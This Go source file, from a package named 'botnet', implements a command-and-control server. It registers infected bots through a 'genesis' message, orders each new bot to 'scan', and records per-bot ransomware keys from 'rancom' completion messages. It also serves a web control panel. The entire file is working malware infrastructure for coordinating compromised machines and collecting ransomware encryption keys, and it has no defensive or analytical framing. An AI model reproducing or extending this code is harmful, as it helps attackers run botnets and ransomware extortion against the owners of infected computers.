package botnet

import (
	"bytes"
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
)

// CC is the command and control center.
type CC struct {
	Port    string
	Host    string
	APIPort string
	Storage Storage
}

//NewCC is
func NewCC(host, port string, s Storage) *CC {
	cc := &CC{
		Host:    host,
		Port:    port,
		APIPort: "8000",
		Storage: s,
	}

	if err := s.CreateTables(); err != nil {
		log.Panic(err)
	}
	return cc
}

//ListenAPI is
func (c *CC) ListenAPI() {
	addr := fmt.Sprintf("%s:%s", c.Host, c.APIPort)
	http.HandleFunc("/api", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("sup"))
	})
	fs := http.FileServer(http.Dir("../web"))
	http.Handle("/", fs)
	Msg("http listening on", addr)
	http.ListenAndServe(addr, nil)
}

//Listen is
func (c *CC) Listen() {
	addr := fmt.Sprintf("%s:%s", c.Host, c.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		Err(err, "listening on addr", addr)
		return
	}
	Msg("listening on", addr)

	c.acceptConnections(listener)
}

func (c *CC) acceptConnections(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			Err(err, "accepting connection")
			continue
		}
		go c.handleConnection(conn)
	}
}

func (c *CC) handleConnection(conn net.Conn) {
	req := new(bytes.Buffer)
	if _, err := io.Copy(req, conn); err != nil {
		Err(err)
		return
	}

	command := bytesToCommand(req.Bytes()[:commandLength])

	switch command {
	case "genesis":
		c.handleGensis(req.Bytes()[commandLength:])
	case "rancom":
		c.handleRansomwareComplete(req.Bytes()[commandLength:])
	}

	conn.Close()
}

func (c *CC) handleRansomwareComplete(payload []byte) {
	req := new(RansomCompleteRequest)
	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
		log.Panic(err)
	}

	if err := c.Storage.AddRansomKey(req.BotID, req.Key); err != nil {
		log.Fatal(err)
	}
}

func (c *CC) handleGensis(payload []byte) {
	bot, err := BytesToBot(payload)
	if err != nil {
		log.Panic(err)
	}

	if _, err := c.Storage.AddBot(bot); err != nil {
		log.Panic(err)
	}
	Msg("bot was added")

	data := append(commandToBytes("scan"), []byte{}...)
	sendData(bot.Addr(), data)
}

func sendData(addr string, data []byte) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Printf("%s is not available\n", addr)
		return
	}
	defer conn.Close()

	_, err = io.Copy(conn, bytes.NewReader(data))
	if err != nil {
		log.Panic(err)
	}
}
